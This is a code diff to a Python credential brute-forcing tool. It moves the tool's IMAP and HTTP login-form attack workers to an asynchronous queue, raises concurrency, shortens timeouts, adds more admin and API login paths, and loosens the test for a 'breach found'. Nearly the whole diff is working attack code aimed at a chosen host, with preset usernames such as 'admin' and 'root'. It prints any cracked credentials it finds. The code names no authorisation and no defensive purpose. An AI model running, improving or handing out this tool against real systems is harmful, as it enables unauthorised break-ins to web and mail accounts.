@@ -62,11 +62,11 @@ async def discover_attack_surface(host):
 def http_post_sync(host, port, path, username, password, use_ssl):
     """Synchronous worker helper for HTTP form brute-forcing."""
     try:
-        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=3.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=3.0)
+        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.5) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.5)
         payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
         }
         conn.request("POST", path, payload, headers)
         resp = conn.getresponse()
@@ -76,53 +76,64 @@ def http_post_sync(host, port, path, username, password, use_ssl):
     except Exception:
         return 0, ""
 
-async def test_imap_auth(host, port, user, password, semaphore, results):
-    """Asynchronous IMAP / IMAPS brute-force worker."""
-    async with semaphore:
-        start = time.time()
-        try:
-            use_ssl = (port in [993, 465])
-            conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
-            reader, writer = await asyncio.wait_for(conn, timeout=3.5)
-
-            await asyncio.wait_for(reader.readline(), timeout=1.5)
-            writer.write(f'A001 LOGIN "{user}" "{password}"\r\n'.encode())
-            await writer.drain()
-
-            response = await asyncio.wait_for(reader.readline(), timeout=2.5)
-            writer.close()
-            await writer.wait_closed()
-
-            elapsed = time.time() - start
-            sys.stdout.write(f"\r\033[K\033[36m[IMAP SCAN] :{port} -> Trying [{user}:{password:<12}]\033[0m")
-            sys.stdout.flush()
-
-            if b"OK" in response:
-                print(f"\n\033[92m[+] IMAP BREACH FOUND [Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port})\033[0m")
-                results.append({"type": "IMAP", "port": port, "user": user, "password": password})
-        except Exception:
-            pass
-
-async def test_http_auth(host, port, path, user, password, semaphore, results):
-    """Asynchronous HTTP form brute-force worker."""
-    async with semaphore:
-        use_ssl = (port == 443)
-        start = time.time()
-        status, body = await asyncio.to_thread(http_post_sync, host, port, path, user, password, use_ssl)
+async def worker_task(queue, host, semaphore, results, stats):
+    """Consumer worker pulling payloads continuously from the async queue."""
+    while True:
+        task_data = await queue.get()
+        if task_data is None:
+            queue.task_done()
+            break
+            
+        vector_type, port, path_or_none, user, password = task_data
         
-        elapsed = time.time() - start
-        sys.stdout.write(f"\r\033[K\033[90m[WEB SCAN] :{port}{path} -> Trying [{user}:{password:<12}] | Code: {status}\033[0m")
-        sys.stdout.flush()
+        async with semaphore:
+            stats["tested"] += 1
+            start = time.time()
+            
+            if vector_type == "HTTP":
+                use_ssl = (port == 443)
+                status, body = await asyncio.to_thread(http_post_sync, host, port, path_or_none, user, password, use_ssl)
+                
+                elapsed = time.time() - start
+                sys.stdout.write(f"\r\033[K\033[90m[WEB SCAN] :{port}{path_or_none} -> [{user}:{password:<10}] Code:{status} (Probed: {stats['tested']})\033[0m")
+                sys.stdout.flush()
 
-        if status in [302, 303] or (status == 200 and ("token" in body.lower() or "success" in body.lower() or "dashboard" in body.lower())):
-            print(f"\n\033[92m[+] WEB BREACH FOUND [Status: {status} | Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port}{path})\033[0m")
-            results.append({"type": "HTTP_FORM", "port": port, "path": path, "user": user, "password": password})
+                # Aggressive success condition check
+                if status in [302, 303] or (status == 200 and any(k in body.lower() for k in ["token", "success", "dashboard", "welcome", "admin"])):
+                    print(f"\n\033[92m[+] WEB BREACH FOUND [Status: {status} | Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
+                    results.append({"type": "HTTP_FORM", "port": port, "path": path_or_none, "user": user, "password": password})
+
+            elif vector_type == "IMAP":
+                try:
+                    use_ssl = (port in [993, 465])
+                    conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
+                    reader, writer = await asyncio.wait_for(conn, timeout=2.5)
+
+                    await asyncio.wait_for(reader.readline(), timeout=1.0)
+                    writer.write(f'A001 LOGIN "{user}" "{password}"\r\n'.encode())
+                    await writer.drain()
+
+                    response = await asyncio.wait_for(reader.readline(), timeout=1.5)
+                    writer.close()
+                    await writer.wait_closed()
+
+                    elapsed = time.time() - start
+                    sys.stdout.write(f"\r\033[K\033[36m[IMAP SCAN] :{port} -> Trying [{user}:{password:<10}] (Probed: {stats['tested']})\033[0m")
+                    sys.stdout.flush()
+
+                    if b"OK" in response:
+                        print(f"\n\033[92m[+] IMAP BREACH FOUND [Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port})\033[0m")
+                        results.append({"type": "IMAP", "port": port, "user": user, "password": password})
+                except Exception:
+                    pass
+
+        queue.task_done()
 
 async def run_autonomous_engine(target_host, passwords, usernames=["admin", "operator", "root", "cryptobyt", "support", "test"]):
-    """Orchestrates simultaneous multi-vector scanning and password testing."""
+    """Orchestrates queue-backed simultaneous multi-vector exploitation with clean exit."""
     try:
         resolved_ip = socket.gethostbyname(target_host)
-        print(f"\n\033[96m[*] Target Target Resolved: {target_host} -> {resolved_ip}\033[0m")
+        print(f"\n\033[96m[*] Target Resolved: {target_host} -> {resolved_ip}\033[0m")
     except socket.gaierror:
         print(f"\n\033[91m[!] Error: Unable to resolve hostname '{target_host}'.\033[0m")
         return [], 0
@@ -134,34 +145,56 @@ async def run_autonomous_engine(target_host, passwords, usernames=["admin", "ope
         print(f"\n\033[91m[-] Target surface is heavily locked down. No open vectors identified.\033[0m")
         return [], time.time() - start_global
 
-    print(f"\n\033[93m[*] Deploying multi-vector asynchronous execution workers...\033[0m")
-    semaphore = asyncio.Semaphore(35) # High concurrency balance for mobile terminals
+    print(f"\n\033[93m[*] Deploying high-speed asynchronous worker queue...\033[0m")
+    
+    queue = asyncio.Queue()
+    semaphore = asyncio.Semaphore(40) # Aggressive concurrency limit tuned for mobile hardware
     results = []
-    tasks = []
+    stats = {"tested": 0}
 
-    web_paths = ["/api/auth/login", "/login", "/signin", "/auth", "/api/login"]
+    # Expanded web authentication attack vectors
+    web_paths = [
+        "/api/auth/login", "/login", "/signin", "/auth", "/api/login",
+        "/admin/login", "/user/login", "/portal/auth", "/api/v1/auth"
+    ]
 
+    # Populate queue dynamically based on discovered ports
+    task_count = 0
     for vector in open_vectors:
         port = vector["port"]
-        
-        # Vector A: Web Forms (Ports 80 / 443)
         if port in [80, 443]:
             for path in web_paths:
                 for user in usernames:
                     for pwd in passwords:
-                        tasks.append(test_http_auth(resolved_ip, port, path, user, pwd, semaphore, results))
-                        
-        # Vector B: Mail / IMAP Servers (Ports 143 / 993)
+                        await queue.put(("HTTP", port, path, user, pwd))
+                        task_count += 1
         elif port in [143, 993]:
             for user in usernames:
                 for pwd in passwords:
-                    tasks.append(test_imap_auth(resolved_ip, port, user, pwd, semaphore, results))
+                    await queue.put(("IMAP", port, None, user, pwd))
+                    task_count += 1
 
-    if tasks:
-        print(f"[*] Firing {len(tasks)} concurrent payload attempts across active vectors...\n")
-        await asyncio.gather(*tasks)
-    else:
+    if task_count == 0:
         print(f"\n\033[93m[*] Open ports detected, but no matching exploitation modules mapped for these services.\033[0m")
+        return [], time.time() - start_global
+
+    print(f"[*] Dispatched {task_count} payload permutations into execution queue.")
+    print(f"[*] Firing concurrent execution streams...\n")
+
+    # Spawn worker pool (e.g. 35 concurrent workers)
+    num_workers = min(35, task_count)
+    workers = [
+        asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
+        for _ in range(num_workers)
+    ]
+
+    # Wait for all tasks in queue to finish processing
+    await queue.join()
+
+    # Poison pill shutdown signal for workers to exit cleanly
+    for _ in range(num_workers):
+        await queue.put(None)
+    await asyncio.gather(*workers)
 
     duration = time.time() - start_global
     return results, duration
